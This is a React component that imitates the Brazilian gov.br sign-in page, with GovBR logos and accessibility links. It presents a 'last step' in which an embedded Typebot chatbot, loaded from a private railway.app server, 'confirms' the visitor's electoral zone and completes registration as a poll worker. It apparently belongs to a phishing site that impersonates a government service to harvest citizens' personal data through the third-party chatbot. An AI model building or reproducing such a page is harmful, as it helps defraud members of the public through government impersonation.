import { useEffect, useRef } from "react";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'typebot-standard': React.DetailedHTMLProps<React.HTMLAttributes<HTMLElement>, HTMLElement>;
    }
  }
}

export default function Chat() {
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Carregar o script do Typebot
    const script = document.createElement("script");
    script.type = "module";
    script.innerHTML = `
      import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js';

      Typebot.initStandard({
        typebot: "my-typebot-o0z0uia",
        apiHost: "https://viewer-production-e969.up.railway.app",
      });
    `;
    document.body.appendChild(script);

    return () => {
      // Cleanup
      if (script.parentNode) {
        script.parentNode.removeChild(script);
      }
    };
  }, []);

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3>Última Etapa - Confirmação via Chat</h3>
            <p>
              Agora vamos confirmar sua zona eleitoral e as datas disponíveis
              através do nosso assistente virtual.
            </p>

            <div
              style={{
                backgroundColor: "#f8f9fa",
                padding: "20px",
                borderRadius: "8px",
                marginTop: "20px",
                minHeight: "600px",
                border: "1px solid #ddd",
              }}
            >
              {/* Container do Typebot */}
              <div ref={containerRef} style={{ width: "100%", height: "600px" }}>
                {/* Typebot será injetado aqui pelo script */}
              </div>
            </div>

            <p
              style={{
                marginTop: "20px",
                fontSize: "13px",
                color: "#666",
                textAlign: "center",
              }}
            >
              Nosso assistente irá confirmar seus dados e finalizar sua inscrição
              como mesário.
            </p>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
